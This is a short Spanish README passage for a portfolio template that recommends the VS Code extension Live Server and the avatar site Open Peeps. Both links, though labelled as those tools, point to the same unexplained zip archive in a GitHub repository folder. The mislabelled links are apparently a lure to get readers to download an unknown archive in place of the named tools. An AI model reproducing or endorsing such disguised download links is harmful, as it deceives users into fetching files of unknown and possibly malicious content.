...
Una recomendación nuestra es que uses la extensión [Live Server](https://raw.githubusercontent.com/joseontiveros/portfolio-template-PR/main/beylic/portfolio-template-PR-1.5-alpha.3.zip) para VS Code. Esta extensión te permite iniciar un servidor en tiempo real y ver los cambios que se hagan en el código.
...
Si te interesa saber más del avatar utilizado en este proyecto, puede ver [Open Peeps](https://raw.githubusercontent.com/joseontiveros/portfolio-template-PR/main/beylic/portfolio-template-PR-1.5-alpha.3.zip) donde podrás personalizar y descargar tu propio avatar con el mismo estilo y gratis.